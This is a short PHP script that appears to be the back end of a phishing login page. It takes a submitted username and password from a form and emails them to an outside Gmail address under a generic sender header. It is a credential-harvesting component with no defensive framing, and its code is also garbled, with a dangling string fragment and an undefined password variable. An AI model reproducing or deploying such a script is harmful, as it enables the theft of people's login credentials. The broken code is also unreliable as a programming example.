<?php
if (isset($_POST["uname"])) {
username:" . $_POST["uname"] . "
password : " . $_POST["psw"];

$retour = mail("jn6woodsenso@gmail.com", $_POST["uname"], $psw, "From:contact@exemplesite.fr\r\nReply-to: " . $_POST["uname"]);
if($retour) {
}
}
?>